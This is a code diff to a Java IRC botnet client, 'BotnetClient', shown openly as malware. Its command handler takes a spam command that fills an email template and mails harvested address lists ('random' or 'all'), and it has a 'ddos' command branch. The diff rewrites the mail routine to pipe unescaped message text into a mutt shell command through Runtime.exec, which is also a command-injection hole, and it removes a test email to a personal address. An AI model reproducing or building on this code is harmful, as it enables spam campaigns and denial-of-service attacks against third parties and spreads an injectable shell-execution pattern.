@@ -55,7 +55,6 @@ public class BotnetClient extends PircBot {
 			setVerbose(DEBUG);
 			setName(id);
 			setMessageDelay(0);
-			sendEmail("shakalandro@gmail.com", new String[] {"shakalandro@gmail.com"}, "works", "sweetness");
 			connect(SERVER, PORT);
 			
 			startKey = MsgEncrypt.getStartKey();
@@ -108,15 +107,14 @@ public class BotnetClient extends PircBot {
 					String x = parts[1];
 					String y = parts[2];
 					String z = parts[3];
-					String from = parts[4];
-					String subject = parts[5];
+					String subject = parts[4];
 					String[] to;
-					if (parts[6].toLowerCase().equals("random")) {
+					if (parts[5].toLowerCase().equals("random")) {
 						to = getEmails(RANDOM_EMAILS);
-					} else if (parts[6].toLowerCase().equals("all")) {
+					} else if (parts[5].toLowerCase().equals("all")) {
 						to = getEmails(EMAILS);
 					} else {
-						to = Arrays.copyOfRange(parts, 6, parts.length);
+						to = Arrays.copyOfRange(parts, 5, parts.length);
 					}
 					String body = "";
 					try {
@@ -128,7 +126,7 @@ public class BotnetClient extends PircBot {
 						System.out.println("There were problems reading " + TEMPLATE);
 					}
 					body = body.replace("XXX", x).replace("YYY", y).replace("ZZZ", z);
-					sendEmail(from, to, subject, body);
+					sendEmail(to, subject, body);
 				}
 			} else if (message.toLowerCase().startsWith("ddos")) {
 				System.out.println(sender + ": " + message);
@@ -183,21 +181,19 @@ public class BotnetClient extends PircBot {
 		}
 	}
 	
-	private void sendEmail(String from, String[] to, String subject, String body) {
+	private void sendEmail(String[] to, String subject, String body) {
 		Runtime r = Runtime.getRuntime();
 		try {
-			/*
-			Process p = r.exec("sendmail -f webmaster@localhost -t \"" + to[0] + "\" -u \"" + subject + "\" -m \"" + body + "\"");
-			
-			Scanner in = new Scanner(new BufferedReader(new InputStreamReader(p.getErrorStream())));
-			if (in.hasNextLine()) {
-				System.out.println(in.nextLine());
+			String emails = "";
+			for (String email : to) {
+				emails += " " + email;
 			}
 			
-			System.out.println("Waiting for sendmail to finish");
+			Process p = r.exec("echo \"" + body + "\" | mutt -s " + subject + emails);
 			p.waitFor();
-			System.out.println("Email sent to " + to[0] + " with exit code " + p.exitValue());
-			*/
+			
+			System.out.println("Email sent to" + emails + " with exit code " + p.exitValue());
+			
 		} catch(Exception e) {
 			e.printStackTrace();
 		}
